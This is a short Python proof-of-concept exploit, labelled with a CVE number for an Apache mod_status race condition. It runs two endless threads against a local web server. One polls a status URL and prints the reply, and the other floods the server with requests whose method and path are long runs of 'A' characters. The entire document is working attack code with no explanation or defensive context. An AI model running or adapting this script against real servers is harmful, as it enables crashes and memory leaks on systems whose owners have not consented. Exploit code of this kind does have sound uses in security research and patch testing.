#CVE-2014-0226
import http.client
import sys
import threading
import subprocess
import random


def send_request(method, url):
    try:
        c = http.client.HTTPConnection("127.0.0.1", 80)
        c.request(method, url)
        if "hello" in url:
            print(c.getresponse().read())
        c.close()
    except Exception as e:
        print(e)
        pass


def mod_status_thread():
    while True:
        send_request("GET", "/hello?notables")


def requests():
    evil = "".join("A" for i in range(random.randint(0, 1024)))
    while True:
        send_request(evil, evil)


threading.Thread(target=mod_status_thread).start()
threading.Thread(target=requests).start()
